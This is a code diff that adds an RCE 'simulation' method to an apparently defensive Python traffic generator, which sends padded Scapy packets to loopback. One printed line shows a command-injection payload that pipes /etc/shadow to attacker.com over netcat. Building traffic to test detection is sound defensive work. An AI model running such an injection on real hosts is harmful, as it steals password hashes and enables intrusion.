@@ -42,6 +42,17 @@ class AttackSimulator:
             time.sleep(0.1)
         print("✅ Brute force simulation completed.")
 
+    def rce_exploit_simulation(self):
+        print(f"💀 [DEMO] Executing Remote Code Execution (RCE) Exploit on {self.target_ip}...")
+        print("   [*] Payload: ; cat /etc/shadow | nc attacker.com 4444")
+        for i in range(15):
+            # Signature: High payload size, specific flags
+            pkt = IP(dst=self.target_ip) / TCP(sport=RandShort(), dport=80, flags="PA") / ("X" * 1200)
+            self._send_packet(pkt)
+            if i % 5 == 0: print(f"   [!] Exfiltrating data chunk {i//5 + 1}...")
+            time.sleep(0.1)
+        print("✅ RCE exploit simulation completed.")
+
 if __name__ == "__main__":
     # Use loopback for testing
     sim = AttackSimulator("127.0.0.1")
